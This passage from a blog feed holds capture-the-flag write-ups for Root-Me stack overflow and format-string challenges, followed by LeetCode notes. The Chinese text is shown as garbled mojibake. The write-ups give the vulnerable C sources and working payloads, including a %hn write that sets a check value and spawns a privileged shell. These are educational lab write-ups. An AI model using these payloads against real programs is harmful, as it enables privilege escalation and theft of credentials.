class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">  <span class="keyword">char</span> buffer[<span class="number">64</span>];</span><br><span class="line">  <span class="keyword">int</span> check;</span><br><span class="line">  <span class="keyword">int</span> i = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">int</span> count = <span class="number">0</span>;</span><br><span class="line"> </span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Enter your name: &quot;</span>);</span><br><span class="line">  fflush(<span class="built_in">stdout</span>);</span><br><span class="line">  <span class="keyword">while</span>(<span class="number">1</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span>(count &gt;= <span class="number">64</span>)</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Oh no...Sorry !\n&quot;</span>);</span><br><span class="line">      <span class="keyword">if</span>(check == <span class="number">0xbffffabc</span>)</span><br><span class="line">        shell();</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        &#123;</span><br><span class="line">            read(fileno(<span class="built_in">stdin</span>),&amp;i,<span class="number">1</span>);</span><br><span class="line">            <span class="keyword">switch</span>(i)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">case</span> <span class="string">&#x27;\n&#x27;</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x08</span>:</span><br><span class="line">                  count--;</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\b&quot;</span>);</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x04</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\t&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">case</span> <span class="number">0x90</span>:</span><br><span class="line">                  <span class="built_in">printf</span>(<span class="string">&quot;\a&quot;</span>);</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                  buffer[count] = i;</span><br><span class="line">                  count++;</span><br><span class="line">                  <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">shell</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setreuid(geteuid(), geteuid());</span><br><span class="line">  system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><code>0x0804866a &lt;+116&gt;:   cmp    DWORD PTR [ebp-0x50],0xbffffabc</code></p><p>å¦‚æœ<code>  buffer[count]</code> æŒ‡å‘ checkçš„åœ°å€ï¼Œ é‚£ä¹ˆ<code>buffer[count] = i</code>å°±å¯ä»¥æŠŠè¾“å…¥å€¼èµ‹ç»™check<br>å°†countå‡ä¸º-4ï¼Œbuffer[-4]å°±ç›¸å½“äºbufferåœ°å€å‡å»4</p><pre><code>app-systeme-ch16@challenge02:~$ (python -c &#39;print &quot;\x08&quot;*4+&quot;\xbc\xfa\xff\xbf&quot;&#39;;cat )| ./ch16Enter your name: iduid=1216(app-systeme-ch16-cracked) gid=1116(app-systeme-ch16) groups=1116(app-systeme-ch16),100(users)cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Stack-buffer-overflow-basic-3&quot;&gt;&lt;a href=&quot;#ELF-x86-Stack-buffer-overflow-basic-3&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Stack buffer overflow basic 3&quot;&gt;&lt;/a&gt;ELF x86 - Stack buffer overflow basic 3&lt;/h2&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>Format string bug basic 2</title>
    <link href="http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/"/>
    <id>http://finsenty54.github.io/2020/11/29/Format_string_bug_basic_2/</id>
    <published>2020-11-29T12:25:46.000Z</published>
    <updated>2020-11-29T12:28:56.901Z</updated>
    
    <content type="html"><![CDATA[<h2 id="ELF-x86-Format-string-bug-basic-2"><a href="#ELF-x86-Format-string-bug-basic-2" class="headerlink" title="ELF x86 - Format string bug basic 2"></a>ELF x86 - Format string bug basic 2</h2><hr><h3 id="snprintf"><a href="#snprintf" class="headerlink" title="snprintf"></a>snprintf</h3><p><code>snprintf</code>â€” prints into a <code>string</code> with length checking<br>(<a href="https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html">https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html</a>)<br>snprintfï¼ˆï¼‰å‡½æ•°åº”ä¸sprintfï¼ˆï¼‰ç­‰æ•ˆï¼Œå¹¶å¢åŠ äº†nå‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å‡ºsæ‰€æŒ‡ç¼“å†²åŒºçš„å¤§å°ã€‚<br>Â·å¦‚æœnä¸ºé›¶ï¼Œåˆ™ä¸å†™ä»»ä½•å†…å®¹ï¼Œè€Œså¯ä»¥ä¸ºç©ºæŒ‡é’ˆã€‚<br>Â·å¦åˆ™ï¼Œå°†ä¸¢å¼ƒç¬¬n-1stä¹‹åçš„è¾“å‡ºå­—èŠ‚ï¼Œè€Œä¸æ˜¯å°†å…¶å†™å…¥æ•°ç»„ï¼Œå¹¶ä¸”åœ¨å®é™…å†™å…¥æ•°ç»„çš„å­—èŠ‚çš„æœ«å°¾å†™å…¥ä¸€ä¸ªç©ºå­—èŠ‚ã€‚<br><em>ä¹Ÿå°±æ˜¯å¢åŠ äº†é™åˆ¶</em></p><a id="more"></a><hr><h3 id="format"><a href="#format" class="headerlink" title="format"></a>format</h3><p><code>format</code>æ˜¯ä¸€ä¸ªå­—ç¬¦ä¸²ï¼Œä»¥å…¶åˆå§‹ç§»ä½çŠ¶æ€ï¼ˆå¦‚æœæœ‰ï¼‰å¼€å§‹å’Œç»“æŸã€‚<br>formatç”±é›¶ä¸ªæˆ–å¤šä¸ª<code>æŒ‡ä»¤</code>ç»„æˆï¼š<code>æ™®é€šå­—ç¬¦</code>ï¼ˆç®€å•åœ°<code>å¤åˆ¶åˆ°è¾“å‡ºæµ</code>ä¸­ï¼‰å’Œ<code>è½¬æ¢è§„èŒƒ</code>ï¼Œæ¯ä¸ªè½¬æ¢è§„èŒƒéƒ½å°†å¯¼è‡´è·å–é›¶ä¸ªæˆ–å¤šä¸ª<code>å‚æ•°</code>ã€‚<br>Â·å¦‚æœformatçš„å‚æ•°ä¸è¶³ï¼Œåˆ™ç»“æœä¸ç¡®å®š</p><hr><h3 id="ï¼…n"><a href="#ï¼…n" class="headerlink" title="ï¼…n $"></a>ï¼…n $</h3><p>Â·å¯ä»¥å°†<code>è½¬æ¢</code>åº”ç”¨äºå‚æ•°åˆ—è¡¨ä¸­æ ¼å¼ä¹‹åçš„ç¬¬nä¸ªå‚æ•°ï¼Œè€Œä¸æ˜¯ä¸‹ä¸€ä¸ªæœªä½¿ç”¨çš„å‚æ•°ã€‚<br>Â·åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œè½¬æ¢è¯´æ˜ç¬¦å­—ç¬¦ï¼…ï¼ˆè¯·å‚è§ä¸‹æ–‡ï¼‰ç”±åºåˆ—â€œï¼…n $â€ä»£æ›¿ï¼Œå…¶ä¸­næ˜¯[1ï¼Œ{NL_ARGMAX}]èŒƒå›´å†…çš„åè¿›åˆ¶æ•´æ•°ï¼Œç»™å‡ºäº†å‚æ•°åœ¨å‚æ•°ä¸­çš„ä½ç½®ã€‚</p><hr><p>For example, <code>printf(&quot;%2$x&quot;, 1, 2, 3)</code> will print<code> 2</code>. In general, we can do <code>printf(&quot;%&lt;some number&gt;$x&quot;)</code> to select an arbitrary argument to printf.</p><hr><h3 id="n"><a href="#n" class="headerlink" title="%n"></a>%n</h3><p>n  å‚æ•°åº”è¯¥æ˜¯ä¸€ä¸ªæŒ‡å‘æ•´æ•°çš„æŒ‡é’ˆï¼Œåˆ°ç›®å‰ä¸ºæ­¢ï¼Œé€šè¿‡å¯¹fprintfï¼ˆï¼‰å‡½æ•°ä¹‹ä¸€çš„è°ƒç”¨ï¼Œå°†å†™å…¥è¾“å‡ºçš„<code>å­—èŠ‚æ•°</code></p><hr><p>The <code>number of characters written so far</code> is stored into the integer indicated by the int * (or variant) pointer argument. No argument is converted.</p><hr><h3 id="æºä»£ç "><a href="#æºä»£ç " class="headerlink" title="æºä»£ç "></a>æºä»£ç </h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">( <span class="keyword">int</span> argc, <span class="keyword">char</span> ** argv )</span></span></span><br><span class="line"><span class="function"> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">int</span> var;</span><br><span class="line">        <span class="keyword">int</span> check  = <span class="number">0x04030201</span>;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">char</span> fmt[<span class="number">128</span>];</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (argc &lt;<span class="number">2</span>)</span><br><span class="line">                <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">memset</span>( fmt, <span class="number">0</span>, <span class="keyword">sizeof</span>(fmt) );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check at 0x%x\n&quot;</span>, &amp;check );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;argv[1] = [%s]\n&quot;</span>, argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">snprintf</span>( fmt, <span class="keyword">sizeof</span>(fmt), argv[<span class="number">1</span>] );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> ((check != <span class="number">0x04030201</span>) &amp;&amp; (check != <span class="number">0xdeadbeef</span>))    </span><br><span class="line">                <span class="built_in">printf</span> (<span class="string">&quot;\nYou are on the right way !\n&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;fmt=[%s]\n&quot;</span>, fmt );</span><br><span class="line">        <span class="built_in">printf</span>( <span class="string">&quot;check=0x%x\n&quot;</span>, check );</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (check==<span class="number">0xdeadbeef</span>)</span><br><span class="line">        &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;Yeah dude ! You win !\n&quot;</span>);</span><br><span class="line">                setreuid(geteuid(), geteuid());</span><br><span class="line">                system(<span class="string">&quot;/bin/bash&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">Download</span><br></pre></td></tr></table></figure><hr><h3 id="try"><a href="#try" class="headerlink" title="try"></a>try</h3><pre><code>app-systeme-ch14@challenge02:~$ (for i in `seq 1 10`; do ./ch14 &quot;%$i&quot;&#39;$08x&#39;; echo;done)check at 0xbffffae8argv[1] = [%1$08x]fmt=[080485f1]check=0x4030201check at 0xbffffae8argv[1] = [%2$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%3$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%4$08x]fmt=[000000c2]check=0x4030201check at 0xbffffae8argv[1] = [%5$08x]fmt=[bffffc34]check=0x4030201check at 0xbffffae8argv[1] = [%6$08x]fmt=[b7fe1439]check=0x4030201check at 0xbffffae8argv[1] = [%7$08x]fmt=[f63d4e2e]check=0x4030201check at 0xbffffae8argv[1] = [%8$08x]fmt=[04030201]check=0x4030201check at 0xbffffae8argv[1] = [%9$08x]fmt=[00000000]check=0x4030201check at 0xbffffae8argv[1] = [%10$08x]fmt=[00000000]check=0x4030201</code></pre><p>ç¬¬<code>8</code>å¤„å­˜ç€<code>check</code></p><hr><pre><code>(for i in `seq 1 12`; do ./format_2 &quot;AAAA%$i&quot;&#39;$08x&#39;;echo;done)check at 0xbffffae8argv[1] = [AAAA%8$08x]fmt=[AAAA04030201]check=0x4030201check at 0xbffffae8argv[1] = [AAAA%9$08x]fmt=[AAAA41414141]check=0x4030201check at 0xbffffae8argv[1] = [ABCD%8$08x]fmt=[ABCD04030201]check=0x4030201check at 0xbffffae8argv[1] = [ABCD%9$08x]fmt=[ABCD44434241]check=0x4030201</code></pre><p>è¾“å…¥å€¼åœ¨ç¬¬ä¹å¤„(å°ç«¯åº)<br>check åœ¨ç¬¬å…«å¤„</p><hr><h3 id="hn"><a href="#hn" class="headerlink" title="%hn"></a>%hn</h3><p>use <code>%hn</code> to write only 2 bytes at a time.</p><pre><code>%n          ä¸€æ¬¡æ€§å†™å…¥ 4 ä¸ªå­—èŠ‚%hn         ä¸€æ¬¡æ€§å†™å…¥ 2 ä¸ªå­—èŠ‚%hhn        ä¸€æ¬¡æ€§å†™å…¥ 1 ä¸ªå­—èŠ‚</code></pre><p>./a.out â€œ$(python -c â€˜import sys; sys.stdout.write(â€œCAAAAAAA<code>%2044x%10$hn</code>%38912x%11$hnâ€)â€™)â€<br><a href="https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html">https://codearcana.com/posts/2013/05/02/introduction-to-format-string-exploits.html</a></p><p><del>printf (â€œ\x10\x01\x48\x08_%08x.%08x.%08x.%08x.%08x|%s|â€);</del></p><p><del>./format_2 $(python2 -c â€˜print â€œ\xd8\xfa\xff\xbf%9$08sâ€â€˜)</del></p><hr><h3 id="final"><a href="#final" class="headerlink" title="final"></a>final</h3><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$x&quot;&#39;)&quot;check at 0xbffffae8argv[1] = [Ã˜ÃºÃ¿Â¿%9$x]fmt=[Ã˜ÃºÃ¿Â¿bffffad8]check=0x4030201app-systeme-ch14@challenge02:~$ ./ch14 &quot;$(python -c &#39;print &quot;\xd8\xfa\xff\xbf%9$s&quot;&#39;)&quot;check at 0xbffffae8argv[1] = [Ã˜ÃºÃ¿Â¿%9$s]fmt=[Ã˜ÃºÃ¿Â¿Ã‚]check=0x4030201</code></pre><hr><p>\xdead=57005<br>\xbeef=48879<br>\xdead-\xbeef=8126<br>ç¬¬ä¹å¤„å†™\xbeef 48879-8<br>ç¬¬åå¤„å†™\xdead 8126(å·²ç»è¾“å‡ºäº†48879)</p><pre><code>app-systeme-ch14@challenge02:~$ ./ch14 $(python -c &#39;print &quot;\xc8\xfa\xff\xbf\xca\xfa\xff\xbf%48871x%9$hn&quot;+&quot;%8126x%10$hn&quot;&#39;)check at 0xbffffac8argv[1] = [ÃˆÃºÃ¿Â¿ÃŠÃºÃ¿Â¿%48871x%9$hn%8126x%10$hn]fmt=[ÃˆÃºÃ¿Â¿ÃŠÃºÃ¿Â¿                                                    ]check=0xdeadbeefYeah dude ! You win !app-systeme-ch14-cracked@challenge02:~$ cat .passwd</code></pre>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;ELF-x86-Format-string-bug-basic-2&quot;&gt;&lt;a href=&quot;#ELF-x86-Format-string-bug-basic-2&quot; class=&quot;headerlink&quot; title=&quot;ELF x86 - Format string bug basic 2&quot;&gt;&lt;/a&gt;ELF x86 - Format string bug basic 2&lt;/h2&gt;&lt;hr&gt;
&lt;h3 id=&quot;snprintf&quot;&gt;&lt;a href=&quot;#snprintf&quot; class=&quot;headerlink&quot; title=&quot;snprintf&quot;&gt;&lt;/a&gt;snprintf&lt;/h3&gt;&lt;p&gt;&lt;code&gt;snprintf&lt;/code&gt;â€” prints into a &lt;code&gt;string&lt;/code&gt; with length checking&lt;br&gt;(&lt;a href=&quot;https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html&quot;&gt;https://pubs.opengroup.org/onlinepubs/009695399/functions/snprintf.html&lt;/a&gt;)&lt;br&gt;snprintfï¼ˆï¼‰å‡½æ•°åº”ä¸sprintfï¼ˆï¼‰ç­‰æ•ˆï¼Œå¹¶å¢åŠ äº†nå‚æ•°ï¼Œè¯¥å‚æ•°æŒ‡å‡ºsæ‰€æŒ‡ç¼“å†²åŒºçš„å¤§å°ã€‚&lt;br&gt;Â·å¦‚æœnä¸ºé›¶ï¼Œåˆ™ä¸å†™ä»»ä½•å†…å®¹ï¼Œè€Œså¯ä»¥ä¸ºç©ºæŒ‡é’ˆã€‚&lt;br&gt;Â·å¦åˆ™ï¼Œå°†ä¸¢å¼ƒç¬¬n-1stä¹‹åçš„è¾“å‡ºå­—èŠ‚ï¼Œè€Œä¸æ˜¯å°†å…¶å†™å…¥æ•°ç»„ï¼Œå¹¶ä¸”åœ¨å®é™…å†™å…¥æ•°ç»„çš„å­—èŠ‚çš„æœ«å°¾å†™å…¥ä¸€ä¸ªç©ºå­—èŠ‚ã€‚&lt;br&gt;&lt;em&gt;ä¹Ÿå°±æ˜¯å¢åŠ äº†é™åˆ¶&lt;/em&gt;&lt;/p&gt;</summary>
    
    
    
    <category term="APP system in root_me" scheme="http://finsenty54.github.io/categories/APP-system-in-root-me/"/>
    
    
    <category term="PWN" scheme="http://finsenty54.github.io/tags/PWN/"/>
    
  </entry>
  
  <entry>
    <title>leetcode add two numbers</title>
    <link href="http://finsenty54.github.io/2020/11/29/leetcode-add-two-numbers/"/>
    <id>http://finsenty54.github.io/2020/11/29/leetcode-add-two-numbers/</id>
    <published>2020-11-29T08:18:58.000Z</published>
    <updated>2020-12-11T08:51:27.366Z</updated>
    
    <content type="html"><![CDATA[<h2 id="leetcode-add-two-numbers"><a href="#leetcode-add-two-numbers" class="headerlink" title="leetcode add two numbers"></a>leetcode add two numbers</h2><p>æœ¬é¢˜å…³äºsingly-linked list å•é“¾è¡¨<br>é“¾è¡¨æ˜¯æ€ä¹ˆé“¾æ¥åœ¨ä¸€èµ·çš„ï¼Ÿï¼Ÿæ€ä¹ˆå­˜å‚¨çš„ï¼Ÿï¼Ÿ</p><a id="more"></a><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">ListNode *<span class="title">Solution::addTwoNumbers</span><span class="params">(ListNode *l1, ListNode *l2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    ListNode *answer = <span class="literal">nullptr</span>;</span><br><span class="line">    ListNode **curr = &amp;answer; <span class="comment">//æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ,ä¸€ç§é—´æ¥å¯»å€æ–¹å¼</span></span><br><span class="line">                               <span class="comment">//å°†answerçš„åœ°å€èµ‹ç»™curr,ï¼ˆ64ä½ï¼‰</span></span><br><span class="line">    ListNode *addr1 = l1;</span><br><span class="line">    ListNode *addr2 = l2;</span><br><span class="line">    <span class="keyword">int</span> carry = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">int</span> sum = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (addr1 != <span class="literal">nullptr</span> || addr2 != <span class="literal">nullptr</span> ||carry&gt;<span class="number">0</span>) <span class="comment">//do not use for()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (addr1!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr1-&gt;val;</span><br><span class="line">            addr1=addr1-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (addr2!=<span class="literal">nullptr</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            sum+=addr2-&gt;val;</span><br><span class="line">            addr2=addr2-&gt;next;</span><br><span class="line">        &#125;</span><br><span class="line">        sum+=carry;</span><br><span class="line">        carry = sum / <span class="number">10</span>;</span><br><span class="line">        (*curr) = <span class="keyword">new</span> ListNode(sum % <span class="number">10</span>); <span class="comment">//æ¯æ¬¡æ–°å»ºä¸€ä¸ªnode,ä¸ç”¨å–å</span></span><br><span class="line">        <span class="comment">//*curr å–å¾—æ˜¯curråœ°å€ä¸­çš„64ä½å†…å®¹ï¼Œ**curr å°±è¦å–ä¸¤æ¬¡åœ°å€ä¸­çš„å†…å®¹</span></span><br><span class="line">        <span class="comment">//è¿™æ˜¯å˜é‡ï¼Œè¿™æ˜¯æŠŠæ–°å»ºnodeçš„åœ°å€èµ‹ç»™answer,å¡«æ»¡64ä½</span></span><br><span class="line">        <span class="comment">//https://www.runoob.com/cplusplus/cpp-pointer-to-pointer.html</span></span><br><span class="line">        curr = &amp;((*curr)-&gt;next); <span class="comment">//æŠŠnextæœ¬èº«çš„åœ°å€èµ‹ç»™curr</span></span><br><span class="line">        <span class="comment">//-&gt; ç›¸å½“äº *ï¼Œè·³è½¬ å–å†…å®¹</span></span><br><span class="line">        sum=<span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> answer;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è§£å†³æ–¹æ³•ï¼šæ¯æ¬¡æ–°å»ºä¸€ä¸ªï¼ŒåŒ¿åæ–°å»º</p><hr><pre><code>ListNode *curr = nullptr; //æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ,ä¸€ç§é—´æ¥å¯»å€æ–¹å¼ListNode *answer = curr;</code></pre><p>è¿™æ ·èµ‹å€¼åï¼Œanswerå¾—åˆ°æ˜¯nullptr</p><pre><code>ListNode *answer = nullptr;ListNode **curr = &amp;answer; //æŒ‡å‘æŒ‡é’ˆçš„æŒ‡é’ˆ,ä¸€ç§é—´æ¥å¯»å€æ–¹å¼</code></pre><p>è¿™æ ·èµ‹å€¼åï¼Œcurrå¾—åˆ°æ˜¯answeræœ¬èº«çš„åœ°å€ï¼Œè€Œä¸æ˜¯å†…å®¹</p>]]></content>
    
    
    <summary type="html">&lt;h2 id=&quot;leetcode-add-two-numbers&quot;&gt;&lt;a href=&quot;#leetcode-add-two-numbers&quot; class=&quot;headerlink&quot; title=&quot;leetcode add two numbers&quot;&gt;&lt;/a&gt;leetcode add two numbers&lt;/h2&gt;&lt;p&gt;æœ¬é¢˜å…³äºsingly-linked list å•é“¾è¡¨&lt;br&gt;é“¾è¡¨æ˜¯æ€ä¹ˆé“¾æ¥åœ¨ä¸€èµ·çš„ï¼Ÿï¼Ÿæ€ä¹ˆå­˜å‚¨çš„ï¼Ÿï¼Ÿ&lt;/p&gt;</summary>
    
    
    
    <category term="leetcode" scheme="http://finsenty54.github.io/categories/leetcode/"/>
    
    
    <category term="C++" scheme="http://finsenty54.github.io/tags/C/"/>
    
  </entry>
  
  <entry>
    <title>leetcode 1 two sum</title>
    <link href="http://finsenty54.github.io/2020/11/26/leetcode-1-two-sum/"/>
    <id>http://finsenty54.github.io/2020/11/26/leetcode-1-two-sum/</id>
    <published>2020-11-26T08:35:52.000Z</published>
    <updated>2020-12-11T08:52:00.926Z</updated>
    
    <content type="html"><![CDATA[<p>leetcode 1 two sum</p><h3 id="å­¦åˆ°çš„ä¸œè¥¿"><a href="#å­¦åˆ°çš„ä¸œè¥¿" class="headerlink" title="å­¦åˆ°çš„ä¸œè¥¿"></a>å­¦åˆ°çš„ä¸œè¥¿</h3><h4 id="hash-table-å“ˆå¸Œè¡¨"><a href="#hash-table-å“ˆå¸Œè¡¨" class="headerlink" title="hash-table å“ˆå¸Œè¡¨"></a>hash-table å“ˆå¸Œè¡¨</h4><p>æ•£åˆ—è¡¨<br>æ˜¯æ ¹æ®é”®ï¼ˆKeyï¼‰è€Œç›´æ¥è®¿é—®åœ¨å†…å­˜å‚¨å­˜ä½ç½®çš„æ•°æ®ç»“æ„</p><p>è‹¥å…³é”®å­—ä¸ºkï¼Œåˆ™å…¶å€¼å­˜æ”¾åœ¨f(k)çš„å­˜å‚¨ä½ç½®ä¸Šã€‚ç”±æ­¤ï¼Œä¸éœ€æ¯”è¾ƒä¾¿å¯ç›´æ¥å–å¾—æ‰€æŸ¥è®°å½•ã€‚ç§°è¿™ä¸ªå¯¹åº”å…³ç³»fä¸ºæ•£åˆ—å‡½æ•°ï¼ŒæŒ‰è¿™ä¸ªæ€æƒ³å»ºç«‹çš„è¡¨ä¸ºæ•£åˆ—è¡¨ã€‚</p><a id="more"></a><p>ä¾‹å¦‚çŸ¥é“å€¼ä¸º3 ï¼Œ å¯ä»¥ç›´æ¥çŸ¥é“åœ°å€ä¸º2<br>åœ°å€index=Hï¼ˆkeyï¼‰</p><hr><h4 id="c-æ¨¡æ¿"><a href="#c-æ¨¡æ¿" class="headerlink" title="c++æ¨¡æ¿"></a>c++æ¨¡æ¿</h4><h4 id="Vector"><a href="#Vector" class="headerlink" title="Vector"></a>Vector</h4><p>å‘é‡ï¼ˆVectorï¼‰æ˜¯ä¸€ä¸ªå°è£…äº†åŠ¨æ€å¤§å°æ•°ç»„çš„é¡ºåºå®¹å™¨ï¼ˆSequence Containerï¼‰ã€‚</p><p>å¯ä»¥ç®€å•çš„è®¤ä¸ºï¼Œå‘é‡æ˜¯ä¸€ä¸ªèƒ½å¤Ÿå­˜æ”¾ä»»æ„ç±»å‹çš„åŠ¨æ€æ•°ç»„ã€‚</p><h4 id="unordered-map"><a href="#unordered-map" class="headerlink" title="unordered_map"></a>unordered_map</h4><p><a 